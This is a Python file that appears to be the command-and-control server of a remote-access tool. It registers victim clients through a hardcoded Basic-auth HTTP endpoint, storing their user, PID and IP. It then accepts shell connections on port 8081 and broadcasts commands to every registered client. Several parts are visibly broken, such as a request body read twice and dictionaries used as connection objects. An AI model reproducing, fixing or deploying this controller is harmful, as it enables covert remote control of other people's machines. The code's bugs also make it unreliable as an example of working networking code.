# from cprint import cprint

import socketserver
from threading import Thread
from legend import server_legacy

import socket, base64
from http.server import BaseHTTPRequestHandler
from urllib.parse import unquote

global req_head, flag
flag = False


class Connect(BaseHTTPRequestHandler):
    global req_head
    def __init__(self, ops_cle='windows', user_cle='', pid_cle='', clientip_cle='', server_address=(), alias_cle=''):
        # super(Connect, self).__init__()
        self.alias_cle = alias_cle
        self.ops_cle = ops_cle
        self.user_cle = user_cle
        self.pid_cle = pid_cle
        self.s = ''
        self.cont = ''
        self.serv_ip = server_address[0]
        self.serv_port = server_address[1]
        self.server_address = server_address
        self.clientip_cle = clientip_cle
        self.client = ''
        self.addr = ''

    def initiate(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        self.s.bind((self.server_address))
        self.s.listen(5)
        # self.s = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        # self.s.load_cert_chain("D:\\certs\\cert.pem", "D:\\certs\\key.pem")
        # self.s = s.wrap_socket(ss, server_side=True)
        self.client, self.addr = self.s.accept()

    def send(self, cmd=''):
        self.client.send(cmd.encode('cp65001'))

    def recv(self):
        return self.client.recv(1024).decode('cp65001')

    def close(self):
        self.s.close()

class Server(BaseHTTPRequestHandler):
    # def __init__(self, user='', pid='', pwd=''):
        # super(Server, self).__init__()

    def do_POST(self):
        creds = 'user:pass'.encode()
        # creds_connect = 'connect:time'.encode()
        if self.headers.get('Authorization') == f'Basic {str(base64.b64encode(creds))[2:-1]}':
            data = str(self.rfile.read(int(self.headers.get('content-length'))))[2:-1]
            port = int((data.split("&")[0]).split("=")[1])

            if port == 3214:
                global req_head, flag
                req_head = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
                req_head = req_head.split('&')
                keys, vals = [], []

                for el in req_head:
                    key = unquote(el.split('=')[0])
                    val = unquote(el.split('=')[1])
                    keys.append(key)
                    vals.append(val)

                req_head = dict(zip(keys, vals))
                del keys
                del vals

                flag = True
                self.send_response(200)
                self.end_headers()

            elif port == 8081:
                dt = data.split("&")[1:]
                alias = dt.split("=")[-1]

        else:
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        return

def send_all(clients, command):
    keys = list(clients.keys())
    for el in keys:
        c = clients[el]
        c.initiate()
        c.send(command)
        c.close()



host = socket.getaddrinfo(socket.gethostname(), None)
ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
print(ipv4_addresses[0])
server_address = ("127.0.0.1", 8000)
shell_address = ('', 8081)

clients = {}
alias = 0
httpd = socketserver.TCPServer(server_address, Server)
server = Thread(target=httpd.serve_forever, args=())
server.start()

while True:
    if flag:
        user = req_head.get('user')
        pid = req_head.get('pid')
        client_ip = req_head.get('ip')

        # cprint.warn(f'Connected from {client_ip} with alias {alias}')
        print(f'Connected from {client_ip} with alias {alias}')

        c = {"user_cle": user, "pid_cle": pid, "clientip_cle": client_ip, "server_address": shell_address, "alias_cle": str(alias)}
        clients[str(alias)] = c
        alias += 1
        with open("temp.db", "w+") as f:
            f.write(str(alias - 1) + "|" + str(c))
            f.close()
        flag = False
